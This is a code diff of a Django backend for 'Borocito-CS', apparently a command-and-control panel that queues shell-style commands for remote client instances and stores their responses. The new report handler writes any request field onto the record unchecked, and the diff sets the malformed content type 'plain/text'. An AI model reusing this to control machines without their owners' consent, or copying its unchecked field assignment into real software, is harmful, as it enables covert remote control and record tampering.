@@ -17,9 +17,18 @@ from configs.models import Component, Configuration
 def report(request: HttpRequest):
     if request.method == "POST":
         cuerpo = dict(json.loads(request.body))
-        instancia = Instancia(**cuerpo)
-        instancia.save()
-        return JsonResponse({"uuid": instancia.uuid}, safe=False, status=201)
+        instancia = Instancia.objects.filter(key=request.headers.get("Key-Pair")).first()
+        if instancia:
+            # Existe, asi que solo actualizamos
+            for campo, valor in cuerpo.items():
+                setattr(instancia, campo, valor)
+            instancia.save()
+            return JsonResponse({"uuid": instancia.uuid}, status=200)
+        else:
+            # No existe, asi que lo creamos
+            instancia = Instancia(**cuerpo)
+            instancia.save()
+            return JsonResponse({"uuid": instancia.uuid}, status=201)
     return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
 
 @csrf_exempt
@@ -46,13 +55,14 @@ def instance(request: HttpRequest):
         instancia.command = None
         instancia.response = request.POST.get('content')
         instancia.save(update_fields=['command', 'response'])
-        return HttpResponse(f"OK! {instancia.uuid} whatever you want bra")
+        return HttpResponse(f"OK! {instancia.uuid}", content_type="plain/text")
     elif request.method == "GET":
-        respuesta = f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\r\nCommand1>{instancia.command or ''}\r\nCommand2>\r\nCommand3>\r\n[Response]\r\n"
-        instancia.command = None
-        instancia.response = None
-        instancia.save(update_fields=['command', 'response'])
-        return HttpResponse(respuesta)
+        respuesta = str(f"#|Borocito-CS|{instancia.uuid}|{datetime.now().strftime("%H:%M:%S %d/%m/%Y")}\n")
+        respuesta += str(f"Command1>{instancia.command or ''}\n")
+        respuesta += str(f"Command2>\n")
+        respuesta += str(f"Command3>\n")
+        respuesta += str(f"[Response]\n")
+        return HttpResponse(respuesta, content_type="plain/text")
     return JsonResponse({"status": "METHOD_NOT_SUPPORTED"}, status=405)
 
 def configuration(request: HttpRequest):
